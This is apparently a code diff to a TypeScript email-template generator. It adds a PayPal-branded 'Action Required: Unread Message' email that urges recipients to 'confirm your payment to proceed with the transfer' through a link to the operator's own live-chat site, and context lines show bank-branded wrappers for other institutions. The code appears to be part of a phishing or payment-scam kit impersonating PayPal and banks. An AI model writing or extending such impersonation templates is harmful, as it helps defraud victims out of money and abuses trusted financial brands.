@@ -367,7 +367,9 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
             peoplechoice: "People's Choice"
          };
          const bankSender = bankNames[bankSrc] || 'Support Team';
-         subject = `${bankSender} — Support Has Replied`;
+         subject = bankSrc === 'paypal'
+            ? `Action Required: Unread Message Regarding Your PayPal Transfer`
+            : `${bankSender} — Support Has Replied`;
 
          // Branded wrappers per bank
          let replyHeader = header;
@@ -396,7 +398,28 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
             btnColor = '#D32F2F';
          }
 
-         content = `${replyHeader}
+         // PayPal-specific live chat reply content
+         const paypalChatContent = bankSrc === 'paypal' ? `
+          <div class="box">
+             <h2 class="headline">Action Required: Unread Message</h2>
+             <p class="text-center text-muted" style="margin-bottom: 16px;">
+               Hello <strong>${data.user_name || 'there'}</strong>, you have an unread message regarding your PayPal transfer.
+             </p>
+             <div class="highlight-box" style="background:#f0f7ff;border:1px solid #d0e3ff;">
+                <span class="highlight-label" style="color:#0070ba;">Unread Message from Support</span>
+                <p class="highlight-value" style="font-size: 14px; line-height: 1.4; color:#003087;">"${data.reply_text || 'You have a new message from support regarding your transfer.'}"</p>
+             </div>
+             <p class="text-center text-muted" style="font-size: 13px; margin-top: 16px;">
+               Please review the message and confirm your payment to proceed with the transfer.
+             </p>
+             <div class="text-center" style="margin-top: 24px;">
+                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" class="btn" style="background-color: ${btnColor};">View Message & Confirm</a>
+             </div>
+             <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #6c7378;">
+               Need help? <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.user_email || '')}" style="color:#0070ba;">Continue live chat</a>
+             </p>
+          </div>
+         ` : `
           <div class="content">
              <h2 class="headline">Support Has Replied 💬</h2>
              <p class="text-center text-muted" style="margin-bottom: 10px;">
@@ -417,7 +440,9 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
                <a href="${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}" style="font-size: 11px;">${data.chat_url || APP_CONFIG.SITE_URL + '/?livechat=true&email=' + encodeURIComponent(data.user_email || '')}</a>
              </p>
           </div>
-          ${replyFooter}`;
+         `;
+
+         content = `${replyHeader}${paypalChatContent}${replyFooter}`;
          break;
       }
 
